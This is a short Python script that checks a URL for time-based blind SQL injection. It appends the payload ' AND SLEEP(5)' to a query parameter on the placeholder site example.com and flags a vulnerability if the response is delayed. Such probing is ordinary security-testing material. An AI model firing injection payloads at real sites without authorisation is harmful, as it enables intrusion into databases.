import time
import requests

def check_vulnerability(url):
  start_time = time.time()
  #send request with injected payload
  response = requests.get(url+" AND SLEEP(5)")
  end_time = time.time()
  #if response time is more than 5 seconds, vulnerability is present
  if end_time - start_time > 5:
      return True
  else:
      return False

url = "https://example.com/page?id=1"

if check_vulnerability(url):
  print("Time based blind SQL injection vulnerability is present")
else:
  print("Time based blind SQL injection vulnerability is not present")
